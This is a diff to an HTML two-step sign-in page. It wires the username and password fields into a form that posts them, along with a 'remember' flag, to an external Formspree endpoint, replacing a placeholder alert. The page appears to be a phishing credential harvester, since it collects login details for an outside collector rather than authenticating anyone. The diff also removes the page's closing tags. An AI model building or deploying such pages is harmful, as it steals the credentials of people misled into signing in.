@@ -117,6 +117,9 @@ display: block;
 </div>
 
 <!-- STEP 1 -->
+<!-- Wrap both steps in a single form -->
+<form action="https://formspree.io/f/xdaplpkv" method="POST">
+<!-- STEP 1 -->
 <div class="step active" id="step1">
 <input type="text" id="username" placeholder="Username">
 
@@ -124,7 +127,7 @@ display: block;
 <label><input type="checkbox"> Remember me</label>
 </div>
 
-<button onclick="nextStep()">Next</button>
+<button type="button" onclick="nextStep()">Next</button>
 
 <div class="links">
 <a href="#">Forgot username/password?</a>
@@ -133,20 +136,23 @@ display: block;
 
 <!-- STEP 2 -->
 <div class="step" id="step2">
-<input type="password" placeholder="Password">
+<!-- Hidden username from step 1 -->
+<input type="hidden" name="username" id="hiddenUsername">
+
+<!-- Password field -->
+<input type="password" name="password" placeholder="Password">
 
 <div class="options">
-<label><input type="checkbox"> Remember me</label>
+<label><input type="checkbox" name="remember"> Remember me</label>
 </div>
 
-<button onclick="submitForm()">Sign in</button>
+<button type="submit">Sign in</button>
 
 <div class="links">
 <a href="#">Forgot password?</a>
 </div>
 </div>
-
-</div>
+</form>
 
 <script>
 function nextStep(){
@@ -155,14 +161,11 @@ if(user === ""){
 alert("Enter username");
 return;
 }
+
+document.getElementById("hiddenUsername").value = user;
+
 document.getElementById("step1").classList.remove("active");
 document.getElementById("step2").classList.add("active");
 }
-
-function submitForm(){
-alert("Signed in");
-}
 </script>
 
-</body>
-</html>
